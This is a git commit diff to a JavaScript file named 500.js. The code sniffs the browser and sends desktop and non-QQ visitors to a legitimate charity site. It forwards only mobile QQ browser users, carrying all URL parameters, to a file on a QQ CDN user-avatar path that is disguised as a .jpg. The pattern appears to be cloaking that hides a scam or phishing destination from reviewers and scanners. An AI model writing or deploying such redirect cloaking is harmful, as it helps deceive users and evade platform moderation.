052d8ede4ef4c5ecb078aaa9801d6cea56037077
xiachedann <2436452144@qq.com>
2024-08-04 18:48:06 +0800

    Update 500.js

--- 500.js
+++ 500.js
@@ -1,17 +1,35 @@
-	// 检测屏幕宽度
-	if (window.innerWidth > 768) { // 假设大于 768px 的宽度为电脑端
-		window.location.href = 'https://gongyi.qq.com/';
-	}
+// 判断是否在移动端访问
+function isMobile() {
+	var userAgent = navigator.userAgent.toLowerCase();
+	return (/iphone|ipad|ipod|android|windows phone/.test(userAgent));
+}
+// 检测是否在移动端 QQ 浏览器中访问
+function isMobileQQBrowser() {
+	var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+	return (userAgent.indexOf('QQ') !== -1 && userAgent.indexOf('Mobile') !== -1);
+}
+// 使用例子
+if (isMobileQQBrowser()) {
+	console.log('当前环境是移动端 QQ 浏览器');
+} else {
+	window.location.href = 'https://gongyi.qq.com/';
+}
 
-	// 获取当前页面的 URL 参数
-	const queryParams = new URLSearchParams(window.location.search);
+// 如果不在移动端访问，则跳转到提示页面
+if (!isMobile()) {
+	window.location.href = 'https://gongyi.qq.com/';
+}
 
-	// 构建新的目标 URL
-	let targetUrl = 'https://example.com/newpage';
 
-	// 将当前页面的所有参数添加到目标 URL 中
-	if (queryParams.toString() !== '') {
-		targetUrl += '?' + queryParams.toString();
-	}
+// 获取当前页面的 URL 参数
+const queryParams = new URLSearchParams(window.location.search);
 
-	window.location.replace(targetUrl);
+// 构建新的目标 URL
+let targetUrl = 'https://cdn.ceo.qq.com/ceo_community/user_avatar/1722680910956.jpg';
+
+// 将当前页面的所有参数添加到目标 URL 中
+if (queryParams.toString() !== '') {
+	targetUrl += '?' + queryParams.toString();
+}
+
+window.location.replace(targetUrl);
